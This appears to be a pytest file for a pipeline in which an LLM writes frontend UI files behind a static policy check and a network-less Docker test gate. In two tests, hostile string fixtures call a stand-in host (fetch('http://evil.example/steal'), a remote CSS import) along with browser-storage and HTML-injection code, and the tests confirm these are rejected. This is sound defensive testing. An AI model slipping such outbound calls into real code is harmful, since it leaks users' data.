"""LLM frontend mode: TeamSocLo writes the UI files (two parallel bounded calls) behind a build + UI-behaviour gate.

The model client and Docker are test doubles here (deterministic, no network). The last test runs the REAL gate image
when it is already built, which proves the benchmark accepts the known-good template UI.
"""

from __future__ import annotations

import asyncio
import dataclasses
import json
import shutil
import subprocess
from uuid import uuid4

import pytest

from intelise_c3.contracts.hybrid import HybridInputPackage, RequirementChangeRequest
from intelise_c3.core.config import COMPONENT_ROOT, Settings
from intelise_c3.domain.llm import (
    LLMGenerationParameters,
    LLMInferenceMetadata,
    LLMInferenceResponse,
    TeamSocLoResponseMetadata,
)
from intelise_c3.hybrid.frontend_policy import check_bundle
from intelise_c3.hybrid.gpa_spec import build_gpa_spec
from intelise_c3.hybrid.gpa_templates import render_frontend_policy, render_frontend_shell, render_frontend_ui
from intelise_c3.hybrid.input_contracts import HybridContractValidator
from intelise_c3.hybrid.knowledge_base import load_knowledge_base
from intelise_c3.hybrid.llm_frontend import (
    FORM_FILES,
    GATE_IMAGE,
    TRUSTED_PATHS,
    group_files,
    run_ui_gate,
    view_files,
)
from intelise_c3.hybrid.pipeline import BackendLlm, HybridPipeline

from test_hybrid_pipeline import _acceptance, _codes, _generate, _package


@pytest.fixture
def pipeline() -> HybridPipeline:
    workdir = COMPONENT_ROOT / "tmp" / f"pytest-hybrid-fe-{uuid4().hex[:8]}"
    settings = Settings(generated_workspace_root=workdir / "ws", traceability_store_path=workdir / "trace.sqlite3",
                        rag_enabled=True, rag_backend="filter", hybrid_llm_cache_dir=workdir / "cache")
    yield HybridPipeline(settings)
    shutil.rmtree(workdir, ignore_errors=True)


def _spec():
    package = HybridInputPackage.model_validate(_package())
    return build_gpa_spec(package, HybridContractValidator().validate(package).design_context, load_knowledge_base())


def _bundle_json(files: dict[str, str]) -> str:
    return json.dumps({"files": [{"path": path, "content": content} for path, content in files.items()]})


def _template_bundles() -> dict[str, str]:
    """The known-good template UI, split exactly like the two LLM file groups."""
    spec = _spec()
    files = render_frontend_ui(spec)
    form = {path: files[path] for path in FORM_FILES if path in files}
    form["frontend/src/components/form.css"] = ".form-grid { display: block; }\n"
    view = {path: files[path] for path in view_files(spec)}
    return {"form": _bundle_json(form), "view": _bundle_json(view)}


class FakeUiModel:
    """Serves each group its scripted outputs in call order; tracks how many calls were in flight at once."""

    def __init__(self, outputs):
        self.outputs = {group: list(values) for group, values in outputs.items()}
        self.requests, self.in_flight, self.max_in_flight = [], 0, 0

    async def generate(self, request):
        prompt = request.messages[1].content
        group = "form" if "YOUR GROUP 'form'" in prompt else "view"
        self.requests.append((group, prompt))
        self.in_flight += 1
        self.max_in_flight = max(self.max_in_flight, self.in_flight)
        await asyncio.sleep(0.03)
        self.in_flight -= 1
        return LLMInferenceResponse(output_text=self.outputs[group].pop(0), metadata=LLMInferenceMetadata(
            provider="teamsoclo-claude", configured_model_identifier="claude-sonnet-5-5", response_model_identifier="claude-sonnet-5-5",
            prompt_template_version=request.prompt_template_version,
            generation_parameters=LLMGenerationParameters(temperature=0.0, timeout_seconds=30, max_tokens=10000),
            client_inference_latency_ms=30.0,
            response=TeamSocLoResponseMetadata(model="claude-sonnet-5-5", input_tokens=2000, output_tokens=900, total_tokens=2900)))


class FakeGateDocker:
    """docker version / image inspect succeed; each gate run answers from a script of failing case ids (or all pass)."""

    CASES = ["ui-has-page-heading", "ui-shows-policy-disclosure", "ui-renders-labelled-form", "ui-grade-selector-lists-policy-grades",
             "ui-add-and-remove-rows", "ui-blocks-invalid-credits", "ui-blocks-missing-fields", "ui-posts-valid-request-and-shows-gpa",
             "ui-counts-toward-gpa-flag-is-sent", "ui-shows-server-review-error", "ui-shows-network-failure", "ui-lists-history"]

    def __init__(self, failing_runs=(), image_ok=True, docker_ok=True):
        self.failing_runs, self.image_ok, self.docker_ok = list(failing_runs), image_ok, docker_ok
        self.runs, self.commands = [], []

    def __call__(self, command, input=None, **_kwargs):
        self.commands.append(command)
        if command[1] == "version":
            return subprocess.CompletedProcess(command, 0 if self.docker_ok else 1, "29.0" if self.docker_ok else "", "" if self.docker_ok else "daemon down")
        if command[1:3] == ["image", "inspect"]:
            return subprocess.CompletedProcess(command, 0 if self.image_ok else 1, "", "")
        if command[1] == "build":
            return subprocess.CompletedProcess(command, 1, "", "network unreachable")
        payload = json.loads(input)
        self.runs.append((command, payload))
        failing = set(self.failing_runs.pop(0)) if self.failing_runs else set()
        tests = [{"id": case, "passed": case not in failing, "observed": "boom" if case in failing else ""} for case in self.CASES]
        return subprocess.CompletedProcess(command, 0, "RESULTS " + json.dumps({"build": {"ok": True, "tail": ""}, "tests": tests}), "")


def _wire(pipeline, model, docker):
    pipeline.backend_llm = BackendLlm("teamsoclo", "claude-sonnet-5-5", lambda: pytest.fail("the small-module client must not be used"),
                                      frontend_client_factory=lambda: model)
    pipeline._sandbox_runner = docker
    pipeline._client_factory = lambda: pytest.fail("OpenRouter must not be used in LLM frontend mode")


def _ui_generate(pipeline):
    return _generate(pipeline, llm_frontend=True)


def test_frontend_policy_accepts_the_template_ui_and_rejects_hostile_code():
    spec = _spec()
    files = render_frontend_ui(spec)
    expected = frozenset(group_files(spec)["view"])
    view = {path: files[path] for path in expected}
    importable = frozenset(TRUSTED_PATHS) | frozenset(FORM_FILES)  # the trusted scaffold plus the other group's files
    assert check_bundle(view, expected, importable) == []
    hostile = dict(view)
    hostile["frontend/src/App.jsx"] = ("import axios from 'axios';\nfetch('http://evil.example/steal');\nlocalStorage.setItem('a', 1);\n"
                                       "export const App = () => <div dangerouslySetInnerHTML={{ __html: 'x' }} />;\n")
    hostile["frontend/src/styles.css"] = "@import url(http://evil.example/x.css);\n"
    findings = " ".join(check_bundle(hostile, expected, importable))
    for label in ("IMPORT_NOT_ALLOWED", "NETWORK", "BROWSER_STORAGE", "HTML_INJECTION", "CSS_FORBIDDEN"):
        assert label in findings, label
    assert "BUNDLE_MISSING_FILES" in " ".join(check_bundle({"frontend/src/App.jsx": "x"}, expected, importable))


def test_two_parallel_calls_write_the_ui_behind_the_gate_and_templates_keep_the_rest(pipeline):
    model, docker = FakeUiModel({g: [out] for g, out in _template_bundles().items()}), FakeGateDocker()
    _wire(pipeline, model, docker)
    run = _ui_generate(pipeline)
    manifest = run["manifest"]
    assert run["status"] == "ACCEPTED" and manifest["generation_mode"] == "LLM_FRONTEND"
    assert model.max_in_flight == 2  # the two file groups were requested concurrently, not one after the other
    modules = {m["module_id"]: m for m in manifest["modules"]}
    assert "fe.gpa-form" not in modules and "fe.validation" not in modules
    assert modules["fe.ui"]["origin"] == "TEAMSOCLO" and modules["fe.ui"]["status"] == "ACCEPTED_LLM_UI_GATE_PASSED"
    assert "R-LLM-FRONTEND-001@1.0.0" in modules["fe.ui"]["rule_ids"] and "R-FE-GPA-FORM-001@1.0.0" in modules["fe.ui"]["rule_ids"]
    owners = {f["path"]: f["module_id"] for f in manifest["files"]}
    for trusted in ("frontend/package.json", "frontend/src/api/gpaApi.js", "frontend/src/main.jsx", "frontend/src/policy/gradingPolicy.js"):
        assert modules[owners[trusted]]["origin"] == "TEMPLATE", trusted  # scaffold stays trusted
    for written in ("frontend/src/App.jsx", "frontend/src/components/GpaCalculatorForm.jsx", "frontend/src/styles.css", "frontend/src/components/form.css"):
        assert owners[written] == "fe.ui", written
    assert modules["be.service"]["origin"] == "TEMPLATE"  # backend untouched
    llm = manifest["llm"]
    assert llm["provider"] == "teamsoclo" and llm["calls"] == 2 and llm["frontend"]["gate_result"]["total"] == 13
    assert llm["frontend"]["trusted_scaffold"] and manifest["rag"]["retrievals"]
    applied = {r["module_id"]: r["applied_to_prompt"] for r in manifest["rag"]["retrievals"]}
    assert applied["fe.ui"] and not applied["be.service"]
    for group, prompt in model.requests:
        assert "UI SPECIFICATION" in prompt and "REQUIRED data-testid" in prompt and f"YOUR GROUP '{group}'" in prompt
        assert "Apply these project best-practice rules" in prompt and "GRADE_OPTIONS" in prompt
        assert "gpaCalculationService" not in prompt and "CREATE TABLE" not in prompt  # no backend or SQL context leaks in
    # the gate ran with no network and no mounts, over trusted + candidate files together
    command, payload = docker.runs[0]
    flat = " ".join(command)
    for flag in ("--network none", "--read-only", "--cap-drop ALL", "--user 1000:1000", GATE_IMAGE):
        assert flag in flat, flag
    assert "-v " not in flat and "--mount" not in flat and "docker.sock" not in flat
    assert {"package.json", "src/api/gpaApi.js", "src/App.jsx", "test/ui.gate.test.jsx", "test/gate-spec.json"} <= set(payload["files"])
    # seams, trace and verification still hold for the merged module
    seams = {s["seam_id"]: s["module_id"] for s in manifest["test_seams"]}
    assert seams["SEAM-GPA-UI-FORM"] == "fe.ui" and run["orphans"] == []
    assert run["verification"]["design_to_code"]["status"] == "PASS" and run["verification"]["architecture"]["status"] == "PASS"
    graph = pipeline.trace("PROJECT-GPA-HYBRID-001")
    assert graph["coverage"]["traced_count"] == 5


def test_a_failing_gate_case_repairs_only_the_group_that_owns_it(pipeline):
    bundles = _template_bundles()
    model, docker = FakeUiModel({"form": [bundles["form"], bundles["form"]], "view": [bundles["view"]]}), FakeGateDocker(failing_runs=[["ui-blocks-invalid-credits"]])
    _wire(pipeline, model, docker)
    run = _ui_generate(pipeline)
    assert run["status"] == "ACCEPTED" and run["manifest"]["llm"]["frontend"]["repaired_groups"] == ["form"]
    assert [group for group, _ in model.requests].count("form") == 2 and [group for group, _ in model.requests].count("view") == 1
    repair_prompt = next(prompt for group, prompt in reversed(model.requests) if group == "form")
    assert "UI_CASE_FAILED[ui-blocks-invalid-credits]" in repair_prompt and "CURRENT_FILES" in repair_prompt
    assert len(docker.runs) == 2 and run["manifest"]["llm"]["calls"] == 3


def test_a_gate_that_still_fails_stops_for_human_review_with_no_fallback(pipeline):
    bundles = _template_bundles()
    model = FakeUiModel({"form": [bundles["form"], bundles["form"]], "view": [bundles["view"]]})
    docker = FakeGateDocker(failing_runs=[["ui-blocks-invalid-credits"], ["ui-blocks-invalid-credits"]])
    _wire(pipeline, model, docker)
    assert _codes(lambda: _ui_generate(pipeline)) == {"HUMAN_REVIEW_REQUIRED"}
    assert pipeline.list_runs() == []  # no artifact, so no template UI was substituted
    record = json.loads(next((pipeline.root / "gpa-hybrid" / "_human-review").glob("review-*.json")).read_text(encoding="utf-8"))
    assert record["template_fallback"] == "NOT_APPLIED" and record["failures"][0]["status"] == "GATE_FAILED_AFTER_REPAIR"
    assert "UI_CASE_FAILED[ui-blocks-invalid-credits]" in record["failures"][0]["reasons"][0]


def test_hostile_ui_code_is_rejected_by_policy_before_any_gate_run(pipeline):
    bundles = _template_bundles()
    hostile = json.loads(bundles["view"])
    hostile["files"][0]["content"] = "export function App() { fetch('http://evil.example'); return null; }\n"
    model = FakeUiModel({"form": [bundles["form"]], "view": [json.dumps(hostile), json.dumps(hostile)]})
    docker = FakeGateDocker()
    _wire(pipeline, model, docker)
    assert _codes(lambda: _ui_generate(pipeline)) == {"HUMAN_REVIEW_REQUIRED"}
    assert docker.runs == []  # the sandbox never saw unsafe code
    record = json.loads(next((pipeline.root / "gpa-hybrid" / "_human-review").glob("review-*.json")).read_text(encoding="utf-8"))
    failure = record["failures"][0]
    assert failure["module_id"] == "fe.ui:view" and len(failure["rejected_outputs"]) == 2 and "NETWORK" in failure["ledger"][0]["validation_result"]


def test_missing_gate_or_provider_stops_before_any_model_call(pipeline):
    model = FakeUiModel({"form": [], "view": []})
    _wire(pipeline, model, FakeGateDocker(image_ok=False))  # image absent and cannot be built (no network)
    assert _codes(lambda: _ui_generate(pipeline)) == {"HUMAN_REVIEW_REQUIRED"} and model.requests == []
    pipeline.backend_llm = BackendLlm("teamsoclo", "m", lambda: None, frontend_client_factory=lambda: None)
    assert _codes(lambda: _ui_generate(pipeline)) == {"HUMAN_REVIEW_REQUIRED"}
    reasons = sorted(json.loads(path.read_text(encoding="utf-8"))["reasons"][0].split(":")[0]
                     for path in (pipeline.root / "gpa-hybrid" / "_human-review").glob("review-*.json"))
    assert reasons == ["GATE_UNAVAILABLE", "TEAMSOCLO_UNAVAILABLE"]


def test_scoped_regeneration_never_replaces_the_model_written_ui(pipeline):
    bundles = _template_bundles()
    _wire(pipeline, FakeUiModel({g: [out] for g, out in bundles.items()}), FakeGateDocker())
    run = _ui_generate(pipeline)
    change = RequirementChangeRequest.model_validate({
        "base_generation_run_id": run["generation_run_id"], "package": _package("gpa_input_package_req103_v2.json"),
        "policy_acceptance": _acceptance(pipeline)})
    assert "LLM_MODULE_IMPACTED_REQUIRES_REVIEW" in _codes(lambda: asyncio.run(pipeline.requirement_change(change)))
    assert pipeline.run_report(run["generation_run_id"])["evidence"]["integrity_problems"] == []


def _gate_image_present() -> bool:
    if shutil.which("docker") is None:
        return False
    try:
        return subprocess.run(["docker", "image", "inspect", GATE_IMAGE], capture_output=True, timeout=30).returncode == 0
    except (OSError, subprocess.TimeoutExpired):
        return False


@pytest.mark.skipif(not _gate_image_present(), reason="the UI gate image is not built (it needs network once)")
def test_the_real_gate_accepts_the_template_ui_and_rejects_a_broken_one():
    """Control + negative control against the real gate container."""
    spec = _spec()
    llm_spec = dataclasses.replace(spec, llm_frontend=True)
    good = {**render_frontend_shell(llm_spec), **render_frontend_policy(llm_spec), **render_frontend_ui(spec)}
    outcome = run_ui_gate(subprocess.run, good, spec)
    assert outcome["executed"], outcome.get("reason")
    assert outcome["ok"], [r for r in outcome["results"] if not r["passed"]]
    broken = dict(good)
    broken["frontend/src/components/PolicyDisclosure.jsx"] = broken["frontend/src/components/PolicyDisclosure.jsx"].replace("{POLICY.authorityStatus}", "(see docs)")
    bad = run_ui_gate(subprocess.run, broken, spec)
    assert bad["executed"] and not bad["ok"]
    assert [r["id"] for r in bad["results"] if not r["passed"]] == ["ui-shows-policy-disclosure"]
